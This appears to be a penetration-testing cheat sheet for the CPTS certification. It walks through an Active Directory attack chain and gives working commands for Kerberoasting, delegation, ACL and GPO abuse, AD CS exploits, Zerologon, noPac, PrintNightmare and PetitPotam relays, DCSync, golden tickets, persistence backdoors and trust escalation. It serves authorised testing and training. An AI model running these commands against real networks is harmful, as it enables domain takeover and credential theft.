CPTS · Active Directory attack chain

Active Directory attacks.

The AD attack chain mapped out for authorised testing: enumerate the domain, roast Kerberos, abuse delegation, ACLs and GPOs, exploit AD CS, chain the high-value CVEs, then take domain dominance and pivot across trusts. Each step links to the tool that does the work.

Full command reference on the CPTS page

The AD attack chain, step by step

  1. 01

    Enumerate the domain

    Situational awareness first: who are the users, where is the DC, and which objects can you already touch? Everything downstream is read off this.

    • Unauthenticated: null / guest session & RID cycling

      Before any credential, try a null or guest bind. A SAMR/LSARPC null session that lists users, or RID cycling that recovers them, is itself a finding.

      enum4linux-ng -A TARGET
rpcclient -U '' -N TARGET -c 'enumdomusers;querydominfo'
nxc smb TARGET -u '' -p '' --rid-brute 10000
nxc smb TARGET -u guest -p '' --users
    • Validate usernames with Kerbrute (no lockout)

      Kerbrute asks the DC for a TGT for each name; AS-REP without pre-auth confirms a valid user and never touches the account's password, so it does not count against lockout. Feed it a name list (username-anarchy, statistically-likely-usernames).

      kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt
kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Welcome1'
    • Authenticated LDAP enumeration

      With any domain credential, read the directory: users, groups, computers, the password policy and the naming context. NetExec's LDAP module and ldapsearch cover the quick questions.

      nxc ldap DC -u user -p pass --users --groups --password-not-required
nxc ldap DC -u user -p pass -M get-desc-users
ldapsearch -x -H ldap://DC -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description
windapsearch.py --dc-ip 10.10.10.10 -u user@corp.local -p pass -U
    • Map attack paths with BloodHound

      Collect the graph and let it find the path. Collect remotely from Linux with bloodhound-python or NetExec, or on-host with SharpHound, then import the zip and run the built-in queries (Shortest paths to Domain Admins, owned-to-DA).

      bloodhound-python -d corp.local -u user -p pass -c All -ns 10.10.10.10 --zip
nxc ldap DC -u user -p pass --bloodhound --collection-method All --dns-server 10.10.10.10
SharpHound.exe -c All --zipfilename loot.zip
    • PowerView / on-host enumeration

      On a Windows foothold, PowerView answers the targeted questions BloodHound hints at: SPN accounts, unconstrained/constrained delegation, interesting ACLs, shares and GPOs.

      Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | select samaccountname
Get-DomainComputer -Unconstrained | select name
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq 'youruser'}
    ↓ Roast Kerberos
  2. 02

    Roast Kerberos

    Two offline-crackable hashes you can often pull with nothing but a username list or one low-priv credential: AS-REP roast and Kerberoast.

    • AS-REP roasting (accounts without pre-auth)

      Any account with 'Do not require Kerberos pre-authentication' set hands out an AS-REP encrypted with its password hash to anyone who asks — no credential needed. Crack the $krb5asrep$ hash offline with Hashcat mode 18200.

      impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat
nxc ldap DC -u user -p pass --asreproast asrep.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
    • Kerberoasting (service accounts with an SPN)

      Any authenticated user can request a service ticket for any SPN; the TGS is encrypted with the service account's NT hash, so request it and crack offline (Hashcat mode 13100). Service accounts often have weak, non-expiring passwords.

      impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.10 -request -outputfile tgs.txt
nxc ldap DC -u user -p pass --kerberoasting kerb.txt
Rubeus.exe kerberoast /outfile:tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
    • Targeted Kerberoasting (via write access)

      If you hold GenericWrite / GenericAll over a user, set a fake SPN on it, Kerberoast it, then clear the SPN. Turns a write ACL into a crackable hash for that account.

      Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc1'}
Rubeus.exe kerberoast /user:victim /nowrap
Set-DomainObject -Identity victim -Clear serviceprincipalname
# Linux: targetedKerberoast.py -d corp.local -u user -p pass
    ↓ Abuse delegation
  3. 03

    Abuse delegation

    Kerberos delegation lets one account act for another. All three flavours are abusable; which one depends on what you found in enumeration.

    • Unconstrained delegation

      A host trusted for unconstrained delegation caches the full TGT of anyone who authenticates to it. Compromise such a host, coerce a Domain Controller to authenticate to it (printerbug / PetitPotam), capture the DC's TGT and use it to DCSync.

      Get-DomainComputer -Unconstrained | select name
Rubeus.exe monitor /interval:5 /nowrap
# coerce the DC to the compromised host:
printerbug.py 'corp.local/user:pass'@DC01 ATTACKER-HOST
Rubeus.exe ptt /ticket:DC01-TGT.kirbi   # then secretsdump -just-dc
    • Constrained delegation (S4U)

      An account with msDS-AllowedToDelegateTo set can, via S4U2self + S4U2proxy, request a service ticket for any user to the named SPN. Impersonate Administrator to that service. Note you can swap the service class (cifs/host/ldap), so one delegated SPN often reaches many services on the host.

      Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator 'corp.local/svc$:pass' -dc-ip 10.10.10.10
export KRB5CCNAME=Administrator.ccache
Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01 /ptt
    • Resource-based constrained delegation (RBCD)

      If you can write the target computer's object (GenericWrite / GenericAll / WriteDACL), set msDS-AllowedToActOnBehalfOfOtherIdentity to a computer account you control, then S4U to impersonate any user to that host. By default any user can add up to 10 machine accounts (MachineAccountQuota).

      impacket-addcomputer corp.local/user:pass -computer-name 'FAKE$' -computer-pass 'Fake123' -dc-ip 10.10.10.10
impacket-rbcd corp.local/user:pass -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write -dc-ip 10.10.10.10
impacket-getST -spn cifs/target.corp.local -impersonate Administrator 'corp.local/FAKE$:Fake123' -dc-ip 10.10.10.10
# Windows: Powermad New-MachineAccount + Set-ADComputer -PrincipalsAllowedToDelegateToAccount
    ↓ Abuse ACLs
  4. 04

    Abuse ACLs & object control

    BloodHound's 'outbound object control' edges are direct privilege. Each right has a one-command abuse; chain them towards a high-value target.

    • Find abusable rights (BloodHound edges)

      Look for GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword and AddMember from a principal you control to a user, group or computer. PowerView resolves them on-host.

      Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs
    • ForceChangePassword over a user

      Reset the victim's password without knowing the old one. Loud and disruptive (the real user loses access), so prefer shadow credentials or targeted Kerberoast when the right allows; note it in the report.

      net rpc password victim 'NewPass123!' -U 'corp.local/attacker%pass' -S DC01
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
    • Shadow credentials (GenericWrite + AD CS)

      With write over a user or computer in an environment that has a CA, add a Key Credential (msDS-KeyCredentialLink) and authenticate via PKINIT — no password reset, quieter than ForceChangePassword, and it yields the NT hash too.

      certipy shadow auto -u attacker@corp.local -p pass -account victim -dc-ip 10.10.10.10
pywhisker.py -d corp.local -u attacker -p pass --target victim --action add
    • AddMember / GenericWrite over a group

      Write access to a group means you can add yourself (or a controlled account) to it — the fast path when the group is Domain Admins or an equivalently privileged group.

      Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker
net rpc group addmem 'Domain Admins' attacker -U 'corp.local/attacker%pass' -S DC01
net group 'Domain Admins' attacker /add /domain   # remove yourself afterwards
    • WriteOwner / WriteDacl

      Lower-level than GenericAll but just as powerful in two steps: take ownership, grant yourself full control, then abuse it. Clean up the ACL afterwards.

      Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
# Linux: impacket-owneredit then impacket-dacledit
    ↓ Abuse GPOs
  5. 05

    Abuse Group Policy

    Write access to a GPO is write access to every computer and user it is linked to: schedule a task, add a local admin, or grant a user right across the OU.

    • Find writable GPOs

      BloodHound's GPO control edges, or PowerView, show which GPOs you can edit and what OUs they apply to. A writable GPO linked to a DC's OU is game over.

      Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|WriteDacl'}
Get-DomainGPO -Identity '{GUID}' | select displayname,gpcfilesyspath
    • SharpGPOAbuse / pyGPOAbuse

      Inject an immediate scheduled task, add a local admin, or add a user right (e.g. SeDebugPrivilege) via the GPO. The change applies on the next policy refresh of every machine in scope — keep it tightly targeted and clean up.

      SharpGPOAbuse.exe --AddComputerTask --TaskName 'upd' --Author corp\admin --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'
pygpoabuse.py corp.local/user:pass -gpo-id '{GUID}' -command 'net localgroup administrators attacker /add'
gpupdate /force   # or wait for refresh
    ↓ Exploit AD CS
  6. 06

    Exploit AD CS

    A misconfigured Certificate Services is a domain-wide backdoor. certipy finds the vulnerable templates; the ESC that applies decides the exploit.

    • Find vulnerable templates (certipy / Certify)

      Enumerate the CA and templates and let the tool flag the ESCs. Start every AD CS assessment here.

      certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout
Certify.exe find /vulnerable
    • ESC1: template lets the enrollee supply the subject

      A template with 'Supply subject in request' + client-authentication EKU that you can enrol in lets you request a cert for any user (SAN = Administrator), then authenticate as them.

      certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
    • ESC8: NTLM relay to the CA web enrolment

      If HTTP web enrolment is on, relay a coerced machine (PetitPotam / printerbug) to /certsrv and request a cert as that machine — relay a DC and you get a DC cert, then DCSync.

      certipy relay -target 'http://CA/certsrv/certfnsh.asp' -template DomainController
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# then coerce: PetitPotam.py ATTACKER DC01
    • ESC2 / 3 / 4 / 6 / 7 (see the cheat sheet)

      Any-purpose or SubCA templates (ESC2/3), a template ACL you can rewrite (ESC4), the EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag (ESC6), and dangerous CA management rights (ESC7). The ESC cheat-sheet table below maps each to its condition and exploit.

      certipy template -u user@corp.local -p pass -template VulnTemplate -save-old   # ESC4 rewrite
certipy req ... -template User -upn administrator@corp.local   # ESC6, SAN honoured by CA
    • Authenticate with the certificate (PKINIT)

      Turn the issued .pfx into a TGT and the account's NT hash via PKINIT. certipy auth does both; Rubeus asktgt /certificate is the Windows equivalent.

      certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # prints TGT + NT hash
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
    ↓ Chain the CVEs
  7. 07

    Chain the high-value CVEs

    A handful of patched-but-common vulnerabilities take you from a low-priv credential (or none) to Domain Admin in one shot. Confirm the patch state, mind the blast radius.

    • Zerologon (CVE-2020-1472)

      A Netlogon flaw lets an unauthenticated attacker reset the DC's machine-account password to empty, then DCSync. It breaks the DC's secure channel — you MUST restore the original hash afterwards or you leave the domain broken. Test first, exploit only in scope with the restore ready.

      python3 zerologon_tester.py DC01 10.10.10.10   # check only
python3 cve-2020-1472-exploit.py DC01 10.10.10.10
secretsdump.py -no-pass -just-dc 'corp.local/DC01$@10.10.10.10'
# RESTORE: reinstall_original_pw.py DC01 10.10.10.10 <orig-hex-hash>
    • noPac / sAMAccountName spoofing (CVE-2021-42278 + 42287)

      Any user who can create a machine account (default MachineAccountQuota) can rename it to a DC's name, request a TGT, then a service ticket back as the DC — impersonating Domain Admin. One command with a built-in shell.

      noPac.py corp.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 --impersonate administrator -shell
noPac.py corp.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 --impersonate administrator -dump
    • PrintNightmare (CVE-2021-34527 / 1675)

      The Print Spooler loads an attacker-supplied driver DLL as SYSTEM. Remote RCE on a DC with spooler enabled, or a local privesc. Check the spooler is reachable first.

      rpcdump.py @10.10.10.10 | egrep 'MS-RPRN|MS-PAR'
CVE-2021-1675.py corp.local/user:pass@10.10.10.10 '\\ATTACKER\share\evil.dll'
    • PetitPotam coercion (CVE-2021-36942) → ADCS relay

      MS-EFSRPC lets you coerce a DC to authenticate to a host you choose, even unauthenticated on unpatched hosts. Relay that to AD CS web enrolment (ESC8) for a DC certificate, then DCSync. The classic unauthenticated-to-DA chain.

      PetitPotam.py -u '' -p '' ATTACKER-IP DC01   # unauth where it still works
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# then: certipy auth -pfx dc.pfx → secretsdump -just-dc
    ↓ Take dominance
  8. 08

    Take domain dominance

    DS-Replication rights mean you can pull every hash; the krbtgt hash means you can forge any ticket. From here it is persistence and clean reporting.

    • DCSync (pull every domain hash)

      With DS-Replication-Get-Changes rights (Domain Admins, or granted by an abused ACL), impersonate a DC and replicate the hashes — including krbtgt and machine accounts. High-impact and logged (4662 / DRSUAPI); run in scope and dump to your own box.

      secretsdump.py 'corp.local/user:pass@DC01' -just-dc-ntlm
secretsdump.py 'corp.local/user:pass@DC01' -just-dc-user krbtgt
mimikatz # lsadump::dcsync /user:corp\krbtgt
    • Golden ticket (forge any TGT from krbtgt)

      The krbtgt NT/AES key signs every TGT, so with it you forge a TGT for any user and any group membership — valid until krbtgt is rotated twice. The ultimate persistence; use a real user and sensible lifetimes to stay quiet.

      impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
    • Silver ticket (forge a TGS for one service)

      With a service account's hash (e.g. a machine account for cifs/host), forge a TGS straight to that service — no DC contact, so quieter than a golden ticket but scoped to one SPN.

      impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local Administrator
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:target.corp.local /service:cifs /rc4:SVC_HASH /ptt
    • Persistence: DSRM, AdminSDHolder, diamond ticket

      Beyond golden tickets: sync the DSRM local admin to act as a DC, backdoor AdminSDHolder so a controlled user keeps rights on protected groups, or forge a diamond ticket (modify a real TGT) to evade golden-ticket detections. Document every persistence artefact for cleanup.

      Rubeus.exe diamond /krbkey:AES_KRBTGT /user:user /password:pass /ticketuser:Administrator
# AdminSDHolder: Add-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity attacker -Rights All
# DSRM: mimikatz lsadump::sam  +  registry DsrmAdminLogonBehavior = 2
    ↓ Cross the trusts
  9. 09

    Cross the trusts

    Domain Admin on one domain is often a stepping stone. Enumerate trusts, then escalate child-to-parent within the forest or pivot across a forest trust.

    • Enumerate trusts

      Map the trust directions and types first — intra-forest (parent/child) trusts share the same forest root and are the easy escalation; cross-forest trusts need foreign access.

      Get-DomainTrust
nltest /domain_trusts /all_trusts
Get-DomainTrustMapping   # PowerView, maps the whole forest
    • Child → parent (intra-forest SID history)

      A child-domain DA can forge a golden ticket with an ExtraSID of the forest root's Enterprise Admins group (RID 519). SID filtering is not enforced inside a forest, so this escalates to the whole forest.

      secretsdump.py 'child.corp.local/da:pass@CHILD-DC' -just-dc-user krbtgt
impacket-ticketer -nthash CHILD_KRBTGT -domain-sid CHILD_SID -domain child.corp.local -extra-sid ROOT_SID-519 Administrator
impacket-raiseChild 'child.corp.local/da:pass'   # does it all in one
    • Cross-forest: trust keys & foreign members

      Across a forest trust, SID filtering blocks the ExtraSID trick, so hunt foreign group memberships and foreign ACLs, or use the shared inter-realm trust key to forge an inter-realm TGT. Kerberoast across the trust where it is allowed.

      Get-DomainForeignGroupMember -Domain target.external
lsadump::trust /patch   # dump the inter-realm trust key (mimikatz)
impacket-GetUserSPNs -target-domain target.external corp.local/user:pass
